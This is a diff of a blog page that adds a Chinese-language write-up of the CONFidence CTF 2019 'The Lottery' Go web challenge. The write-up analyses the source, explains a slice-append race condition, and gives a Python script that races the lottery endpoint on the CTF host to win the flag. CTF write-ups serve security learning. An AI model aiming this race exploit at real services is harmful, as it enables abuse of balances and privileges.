@@ -15,7 +15,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>Automne&#39;s Shadow</title>
+    <title>CONFidence CTF 2019 The Lottery WriteUp · Automne&#39;s Shadow</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -70,6 +70,8 @@
 
     <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
     <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -194,6 +196,8 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
@@ -201,27 +205,85 @@
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
     
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Automne&#39;s Shadow.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">CONFidence CTF 2019 The Lottery WriteUp</a>
+            </div>
+    </div>
+    
     <a class="home-link" href="/">Automne's Shadow.</a>
 </header>
     <div class="wrapper">
-        <div class="site-intro" style>
+        <div class="site-intro" style="height:50vh;">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            CONFidence CTF 2019 The Lottery WriteUp
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="golang">golang</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="race condition">race condition</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/03/27</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -322,107 +384,94 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/03/12/BSidesSF-CTF-2019-GoodLuks-WriteUp/">
-            
-                <span>BSidesSF CTF 2019 GoodLuks WriteUp</span>
-        </a>
-        <div class="abstract-content">
-            <p><strong>Forensics</strong><br>
-        </p></div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/12</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="luks">luks</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="hashcat">hashcat</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="photorec">photorec</a>
-    
-</div>
-            
-        </div>
+            <main class="main post-page">
+    <article class="article-entry">
+        <p><strong>Web</strong><br><a id="more"></a></p>
+<p>最近在学GoLang。</p>
+<p>本题参考链接：<a href="https://balsn.tw/ctf_writeup/20190317-confidencectf/#the-lottery" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190317-confidencectf/#the-lottery</a></p>
+<p><img src="1.png" alt="automne"></p>
+<p>使用Go语言编写的API服务器，下载压缩包后首先看main.go，主要是搭建一个HTTP Server。比较重要的是下面两行，分别定义了一个service和初始化了路由。</p>
+<pre><code>service := app.NewService(ctx, lotteryPeriod, deleteAccountAfter)
+router := transport.InitRouter(service, flag)
+</code></pre><p>service的返回值如代码所示：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">func</span> <span class="title">NewService</span><span class="params">(ctx context.Context, lotteryPeriod, deleteAccountAfter time.Duration)</span> *<span class="title">Service</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;Service&#123;</span><br><span class="line">		accounts:           <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]Account),</span><br><span class="line">		lottery:            NewLottery(ctx, lotteryPeriod),</span><br><span class="line">		deleteAccountAfter: deleteAccountAfter,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后InitRouter里提供了下面的Rest API接口：</p>
+<pre><code>r.Get(&quot;/&quot;, handler.IndexGet)
+r.Post(&quot;/account&quot;, handler.AccountAdd)
+r.Post(&quot;/account/{name}/amount&quot;, handler.AccountAddAmount)
+r.Get(&quot;/account/{name}&quot;, handler.AccountGet)
+r.Post(&quot;/lottery/add&quot;, handler.LotteryAdd)
+r.Get(&quot;/lottery/results&quot;, handler.LotteryResults)
+</code></pre><p>其中的handler.AccountGet方法，当flag变量为true时，将会在请求对应账号的响应里返回flag。</p>
+<p><img src="2.png" alt="automne"></p>
+<p>接着跟到h.service.AccountGet方法里</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Service)</span> <span class="title">AccountGet</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="params">(Account, <span class="keyword">bool</span>, error)</span></span> &#123;</span><br><span class="line">	s.mutex.RLock()</span><br><span class="line">	<span class="keyword">defer</span> s.mutex.RUnlock()</span><br><span class="line">	account, found := s.accounts[name]</span><br><span class="line">	<span class="keyword">if</span> !found &#123;</span><br><span class="line">		<span class="keyword">return</span> Account&#123;&#125;, <span class="literal">false</span>, ErrNotFound</span><br><span class="line">	&#125;</span><br><span class="line">	superUser := s.lottery.IsWinner(name) || account.IsMillionaire()</span><br><span class="line">	<span class="keyword">return</span> account, superUser, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，s.lottery.IsWinner(name) || account.IsMillionaire()为true，就可以成为superUser拿到flag。</p>
+<p>先看s.lottery.IsWinner(name)，代码如下：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *Lottery)</span> <span class="title">IsWinner</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	l.mutex.RLock()</span><br><span class="line">	<span class="keyword">defer</span> l.mutex.RUnlock()</span><br><span class="line">	<span class="keyword">if</span> _, won := l.winners[name]; won &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后跟到下面的函数里，也就是当账号里的amounts达到0x133700时，将会成为winner，但是由于是随机数，所以需要爆破。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *Lottery)</span> <span class="title">evaluate</span><span class="params">()</span></span> &#123;</span><br><span class="line">	l.mutex.Lock()</span><br><span class="line">	<span class="keyword">defer</span> l.mutex.Unlock()</span><br><span class="line">	accounts := l.accounts</span><br><span class="line">	l.winners = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">	l.accounts = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]Account)</span><br><span class="line">	<span class="keyword">for</span> name, account := <span class="keyword">range</span> accounts &#123;</span><br><span class="line">		amounts := <span class="built_in">append</span>(account.Amounts, randInt(<span class="number">999913</span>, <span class="number">3700000</span>))</span><br><span class="line">		sum := <span class="number">0</span></span><br><span class="line">		<span class="keyword">for</span> _, a := <span class="keyword">range</span> amounts &#123;</span><br><span class="line">			sum += a</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> sum == <span class="number">0x133700</span> &#123;</span><br><span class="line">			l.winners[name] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接着看account.IsMillionaire()这个条件。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *Account)</span> <span class="title">IsMillionaire</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	sum := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> _, a := <span class="keyword">range</span> a.Amounts &#123;</span><br><span class="line">		sum += a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sum &gt;= <span class="number">1000000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>只要账号的Amounts达到1000000即可，但是AddAmount函数对添加的次数和金额都做了限制，其中MaxAmount为99，MaxAmountsLen为4。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *Account)</span> <span class="title">AddAmount</span><span class="params">(amount <span class="keyword">int</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> amount &lt; <span class="number">0</span> || amount &gt; MaxAmount &#123;</span><br><span class="line">		<span class="keyword">return</span> errors.Wrapf(ErrInvalidData, <span class="string">"amount must be positive and less than %d: got '%d'"</span>, MaxAmount+<span class="number">1</span>, amount)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(a.Amounts) &gt;= MaxAmountsLen &#123;</span><br><span class="line">		<span class="keyword">return</span> errors.Wrapf(ErrInvalidData, <span class="string">"reached maximum number of amounts (%d)"</span>, MaxAmountsLen)</span><br><span class="line">	&#125;</span><br><span class="line">	a.Amounts = <span class="built_in">append</span>(a.Amounts, amount)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对接口进行测试</p>
+<p><img src="3.png" alt="automne"></p>
+<p>当传入4次amount后再添加amount将会报错</p>
+<p><img src="4.png" alt="automne"></p>
+<p><img src="5.png" alt="automne"></p>
+<p>要想成为百万富翁，留意到Lottery里的evaluate函数，其中的append()方法有机会将100万添加到账号里。</p>
+<pre><code>amounts := append(account.Amounts, randInt(999913, 3700000))
+</code></pre><p>看一下amounts的类型，是一个数组切片。</p>
+<pre><code>type Account struct {
+    Name    string `json:&quot;name&quot;`
+    Amounts []int  `json:&quot;amounts&quot;`
+}
+</code></pre><p>对于Go里面的数组切片，如果其capacity存在冗余，那么并发写数据的时候，就会存在条件竞争的问题。<br>思路就是先通过handler.AccountAddAmount方法添加三次金额，然后调用handler.LotteryAdd方法和其条件竞争，写入成功即可得到flag。</p>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://lottery.zajebistyc.tf'</span></span><br><span class="line"></span><br><span class="line">names = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">999999</span>):</span><br><span class="line">    r = s.post(url + <span class="string">"/account"</span>).json()</span><br><span class="line">    name = r[<span class="string">'name'</span>]</span><br><span class="line">    names.append(name)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        r = s.post(url + <span class="string">f'/account/<span class="subst">&#123;name&#125;</span>/amount'</span>, json=dict(amount=<span class="number">99</span>))</span><br><span class="line">		</span><br><span class="line">    r = s.get(url + <span class="string">f'/account/<span class="subst">&#123;name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line">    r = s.post(url + <span class="string">f'/lottery/add'</span>, json=dict(accountName=name))</span><br><span class="line"></span><br><span class="line">    r = s.post(url + <span class="string">f'/account/<span class="subst">&#123;name&#125;</span>/amount'</span>, json=dict(amount=<span class="number">87</span>))</span><br><span class="line"></span><br><span class="line">    r = s.get(url + <span class="string">f'/account/<span class="subst">&#123;name&#125;</span>'</span>)</span><br><span class="line">    print(r.text)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'log'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        print(r.text, file=f)</span><br></pre></td></tr></table></figure>
+<p>得到flag:</p>
+<p><img src="6.png" alt="automne"></p>
+
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/12/14/Otter-CTF-2018-Forensics-WriteUp-Part2/">
-            
-                <span>OtterCTF 2018 Forensics WriteUp Part 2</span>
-        </a>
-        <div class="abstract-content">
-            <p><strong>Forensics</strong><br>
-        </p></div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/12/14</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="volatility">volatility</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="malware">malware</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="codereflect">codereflect</a>
-    
-</div>
-            
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://ce-automne.github.io">Automne</a>
+            </p><p>原文链接: <a href="https://ce-automne.github.io/2019/03/27/CONFidence -CTF-2019-The Lottery -WriteUp/">https://ce-automne.github.io/2019/03/27/CONFidence -CTF-2019-The Lottery -WriteUp/</a>
+            </p><p>发表日期: <a href="https://ce-automne.github.io/2019/03/27/CONFidence -CTF-2019-The Lottery -WriteUp/">March 27th 2019, 10:54:00 pm</a>
+            </p><p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/12/13/Otter-CTF-2018-Forensics-WriteUp-Part1/">
-            
-                <span>OtterCTF 2018 Forensics WriteUp Part 1</span>
-        </a>
-        <div class="abstract-content">
-            <p><strong>Forensics</strong><br>
-        </p></div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/12/13</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="volatility">volatility</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="yara plugin">yara plugin</a>
-    
-</div>
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/03/21/MySQL-Blind-Injection-Scripts/" title="MySQL" blind injection scripts>
+                    <div class="prevTitle">MySQL Blind Injection Scripts</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -496,6 +545,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -902,6 +969,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
